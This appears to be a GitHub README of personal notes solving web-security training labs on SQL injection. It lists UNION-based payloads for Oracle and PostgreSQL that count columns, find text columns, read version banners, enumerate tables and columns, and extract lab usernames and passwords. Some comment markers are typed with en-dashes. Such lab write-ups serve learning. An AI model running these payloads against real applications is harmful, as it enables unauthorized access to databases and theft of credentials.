# SQL-injection-a-to-z-
![logo](https://github.com/cyber-insect99/photo-gallery-/blob/main/Blue%20Gradient%20Modern%20LinkedIn%20Banner.png)
<h3 align="center">SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior. (SQLi)</h3>

<p align="left"> <img src="https://komarev.com/ghpvc/?username=cyber-insect99&label=Profile%20views&color=0e75b6&style=flat" alt="cyber-insect99" /> </p>

<h3 align="left">Connect with me:</h3>
<p align="left">
</p>

<p>&nbsp;<img align="center" src="https://github-readme-stats.vercel.app/api?username=cyber-insect99&show_icons=true&locale=en" alt="cyber-insect99" /></p>
Lab :6 SQL injection attack, listing the database contents on Oracle
---------------------------------------------------------------
---------------------------------------------------------------
Step : 1   Determine the number of columns
>> '  order by  n- -    ->  ok

Step : 2   Figure out which column contain text
>> ' UNION select 'a', 'a' from DUAL--   [oracle database]

Step : 3   version of database
>> 'UNION SELECT banner, NULL From v$version--

Step : 4   Output list of  table names  in the database
>> ' UNION select table_name, Null From all_tables--
--> “ USERS_RQHGEF  ”

Step : 5   Output the column names of the table
--> ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_RQHGEF'--
Column-name→ USERNAME_JLSJYT , PASSWORD_HJYSRZ

Step : 6   Output the usernames and passwords
--> ' UNION SELECT USERNAME_JLSJYT,PASSWORD_HJYSRZ FROM USERS_RQHGEF--

Administrator,  b53a64jetfw8n2fniq4lS

Lab 7: SQL injection UNION attack, determining the number of columns returned by the query
-------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------
' UNION select Null--                          Internal server error
' UNION select Null ,Null--                    Internal server error
' UNION select Null ,Null ,Null--              ok    column no is 2 

Lab 8: SQL injection UNION attack, finding a column containing text
-------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------
' UNION select Null ,Null ,Null–
' UNION select Null ,Null ,'abc'--   
' UNION select 'abc',Null ,Null--    
' UNION select Null ,'abc' ,Null--  → working 
' UNION select Null ,'oXrCmP' ,Null--  → working

 pass this  string thought this  position

Lab 9: SQL injection UNION attack, retrieving data from other tables
-------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------
End Goal : Output the usernames and passwords in the users table login as the administrator user.

Step : 1   Determine the number of columns
Step : 2   Determine the data type of the columns
' UNION select ' a',Null–
' UNION select 'a','a' –
→ both column are of data type string
Step : 3
' UNION select username,password from users–-



Lab 10: SQL injection UNION attack, retrieving multiple values in a single column
-------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------

Step : 1   Determine the number of columns
'  order by  n- -    ->  ok
Step : 2   Determine the data type of the columns
' UNION select ' a',Null–-        server error
' UNION select Null,'a' –-          ok
Step : 3   version of database
' UNION select Null,version()--
PostgreSQL 12.16
' UNION select Null,username from users–-
' UNION select Null,password from users–-

' UNION select Null, username || password from users--
administrator  ksdy1dvq0sau0q7cie8r
